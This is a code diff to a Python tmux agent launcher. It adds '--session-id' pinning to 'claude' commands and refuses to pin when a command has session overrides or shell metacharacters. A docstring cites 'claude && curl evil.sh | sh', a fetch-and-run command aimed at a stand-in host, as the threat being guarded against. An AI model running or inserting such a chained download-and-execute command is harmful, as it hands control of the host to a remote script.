@@ -29,9 +29,10 @@ import logging
 import os
 import re
 import subprocess
+import uuid
 from dataclasses import dataclass
 
-from chela import agent_manager, config, discovery
+from chela import agent_manager, config, discovery, sessionids
 
 log = logging.getLogger(__name__)
 
@@ -44,6 +45,25 @@ _WID_RE = re.compile(r"@\d+")
 # (letters, digits, '-' or '_'). ``shell-N`` always does; this asserts the invariant so a
 # future change to the name scheme can't silently produce a name tmux/the API would reject.
 _WINDOW_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")
+
+# A launch command that already pins/resumes/forks a session itself — appending our own
+# generated `--session-id` on top would be silently ignored by the CLI at best, and at
+# worst a fabricated claim about which session ends up running. Both long and short forms
+# (`--resume`/`-r`, `--continue`/`-c`), verified against `claude --help`. See
+# `_pin_session_id`.
+_SESSION_OVERRIDE_RE = re.compile(
+    r"(?:^|\s)(?:--session-id|--resume|-r|--continue|-c|--fork-session|--from-pr"
+    r"|--no-session-persistence)(?:[\s=]|$)"
+)
+
+# The leading `claude` token — where `--session-id` is inserted, never appended (see
+# `_pin_session_id`: appending lands the flag on whatever runs last in a chained command).
+_LEADING_CLAUDE_RE = re.compile(r"^claude(?=\s|$)")
+
+# Any of these means `command` is more than a single `claude` invocation — chela cannot
+# tell which process `--session-id` would end up bound to (a trailing `| sh`, a chained
+# `&& curl ... | sh`, a substitution), so pinning is refused entirely rather than guessed.
+_METACHARACTER_RE = re.compile(r"[;&|`\n]|\$\(")
 
 
 @dataclass
@@ -96,6 +116,58 @@ def _send(target: str, text: str) -> None:
         log.warning("send-keys to %s failed (%r): %s", target, text, e)
 
 
+def _pin_session_id(command: str, generated: str) -> tuple[str, str | None]:
+    """Insert ``--session-id <generated>`` right after the leading ``claude`` token.
+
+    ``generated`` is produced ONCE by the caller and threaded through unchanged, so
+    whatever ends up in the sent command and whatever gets recorded are the exact same
+    string — never two independently-generated uuids.
+
+    Inserted, never appended: ``_LAUNCH_CMD_RE`` (``dashboard/app.py``) admits shell
+    metacharacters in an otherwise-``claude``-prefixed command, so an append lands the
+    flag on whatever actually runs last (``claude && curl evil.sh | sh`` would append
+    onto ``sh``) — a fabricated binding for a process that was never ``claude`` at all.
+
+    Nothing is pinned — ``command`` is returned untouched and the second element is
+    ``None`` — in three cases, each because chela cannot honestly attribute a session
+    id: ``command`` already carries an override (``--session-id``/``--resume``/``-r``/
+    ``--continue``/``-c``/``--fork-session``/``--from-pr``/``--no-session-persistence``,
+    which will run under a session chela did not choose); ``command`` contains a shell
+    metacharacter (``;``, ``&&``, ``||``, ``|``, a backtick, ``$(``, or a newline — chela
+    cannot tell which process would end up running); or ``command`` does not start with
+    a leading ``claude`` token at all.
+    """
+    if _SESSION_OVERRIDE_RE.search(command):
+        return command, None
+    if _METACHARACTER_RE.search(command):
+        return command, None
+    m = _LEADING_CLAUDE_RE.match(command)
+    if not m:
+        return command, None
+    cut = m.end()
+    return f"{command[:cut]} --session-id {generated}{command[cut:]}", generated
+
+
+def _record_session_id(wid: str, session_id: str) -> bool:
+    """Persist ``wid -> session_id`` in the dedicated session-id store. True on success.
+
+    Best-effort in the sense that it never raises into the caller, but UNLIKE
+    :func:`_send` it reports failure rather than swallowing it: the caller
+    (:func:`spawn_window`) must send the command *unpinned* when this fails, since a
+    ``--session-id`` chela could not record is the same fabricated-binding problem in
+    the other direction — a running session with an id nothing else can look up.
+
+    Recording-only for now (docs/AGENT_IDENTITY.md slice 2a) — nothing resolves a
+    window's session through this store yet; that is slice 3/4.
+    """
+    try:
+        sessionids.set_session_id(wid, session_id)
+        return True
+    except Exception:
+        log.warning("failed to record session id for %s", wid, exc_info=True)
+        return False
+
+
 def spawn_window(cwd: str | os.PathLike, *, command: str | None = None) -> SpawnResult:
     """Open ONE tmux window in ``cwd`` and, if given, launch ``command`` in it.
 
@@ -116,8 +188,14 @@ def spawn_window(cwd: str | os.PathLike, *, command: str | None = None) -> Spawn
       "claude" (:func:`chela.agent_manager.lock_window_name`);
     * export ``CHELA_WID`` into the fresh shell so the agent knows its own window id
       (self-identity for peek/read/drive), whenever tmux gave us the id;
-    * if ``command`` is given, ``send-keys`` it — we start a shell and *send* the command
-      rather than running it as the window command, so the pane survives the command exiting.
+    * if ``command`` is given AND we have a ``wid``, pin a chela-generated
+      ``--session-id`` onto it and record ``wid -> session_id`` in the dedicated
+      session-id store (:func:`_pin_session_id`, :func:`_record_session_id`,
+      :mod:`chela.sessionids`) — recording only, for now (docs/AGENT_IDENTITY.md
+      slice 2a). A record failure sends ``command`` unpinned instead;
+    * ``send-keys`` the (possibly session-pinned) command — we start a shell and *send*
+      the command rather than running it as the window command, so the pane survives
+      the command exiting.
 
     Command VALIDATION is the caller's job, done before calling here: the dashboard vets a
     user-supplied ``command`` against its ``claude``-only allowlist (untrusted input);
@@ -161,7 +239,17 @@ def spawn_window(cwd: str | os.PathLike, *, command: str | None = None) -> Spawn
     if have_wid:
         _send(target, f"export CHELA_WID={wid}")
     if command:
-        _send(target, command)
+        to_send = command
+        if have_wid:
+            # Pin + record the session chela is about to start — only possible when
+            # there's a `wid` to record it against. See `_pin_session_id`. A record
+            # failure means the pinned id would run un-recorded — the same fabricated
+            # binding this exists to prevent, just aimed the other way — so fall back
+            # to sending `command` unpinned rather than the pinned-but-unrecorded one.
+            pinned, session_id = _pin_session_id(command, str(uuid.uuid4()))
+            if session_id and _record_session_id(wid, session_id):
+                to_send = pinned
+        _send(target, to_send)
 
     log.info("spawned window %s (%s) in %s%s", name, wid or "no-id", real,
              f" running {command!r}" if command else "")
